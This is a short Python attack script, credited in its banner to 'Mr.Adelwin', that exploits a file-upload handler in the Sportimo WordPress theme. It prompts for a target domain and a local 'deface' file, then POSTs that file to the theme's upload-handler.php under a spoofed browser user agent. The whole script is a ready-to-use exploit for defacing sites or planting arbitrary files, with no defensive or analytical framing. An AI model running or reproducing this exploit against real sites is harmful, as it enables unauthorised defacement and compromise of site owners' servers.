import requests
from termcolor import colored

baner= """

   _____                  _   _                 
  / ____|                | | (_)                
 | (___  _ __   ___  _ __| |_ _ _ __ ___   ___  
  \___ \| '_ \ / _ \| '__| __| | '_ ` _ \ / _ \ 
  ____) | |_) | (_) | |  | |_| | | | | | | (_) |
 |_____/| .__/ \___/|_|   \__|_|_| |_| |_|\___/ 
        | |   - By Mr.Adelwin -
        |_|
"""
print(colored(baner,'green'))

headers={
  'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0  '
}
path_vuln='/wp-content/themes/sportimo-theme/functions/upload-handler.php'
target=str(input(colored('Target domain: ','yellow')))
URL=target+path_vuln
files_deface=str(input(colored('Your script deface: ','yellow')))
deface=open(files_deface, 'r')
form_files={
  'orange_themes':deface
}
x=requests.post(URL, files=form_files, headers=headers)
print(x.text)
    
